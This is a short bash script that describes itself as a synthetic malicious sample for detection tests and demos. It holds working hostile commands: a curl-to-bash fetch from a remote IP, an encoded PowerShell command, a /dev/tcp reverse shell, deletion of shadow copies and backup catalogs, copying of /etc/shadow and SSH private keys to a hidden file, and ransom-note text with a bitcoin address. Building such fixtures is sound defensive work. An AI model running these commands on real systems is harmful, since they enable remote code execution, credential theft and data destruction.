#!/bin/bash
# Synthetic malicious sample for REA tests and demos. Not a real threat.
# It exercises several detections at once.

TARGET="http://185.220.101.44/stage2.sh"
KEY="c3RhZ2Uy"
C2="https://cdn-malicious-example.top/gate"

curl -fsSL "$TARGET" | bash

powershell -EncodedCommand JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA==

echo "connecting to $C2"
bash -i >& /dev/tcp/185.220.101.44/4444 0>&1

vssadmin delete shadows /all /quiet
wbadmin delete catalog -quiet

cat /etc/shadow > /tmp/.staged
cp ~/.ssh/id_rsa /tmp/.staged
cp ~/.ssh/authorized_keys /tmp/.staged

printf '%s\n' "your files have been encrypted"
printf '%s\n' "send bitcoin to bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"
printf '%s\n' "all your files are locked, use the decryptor tool"
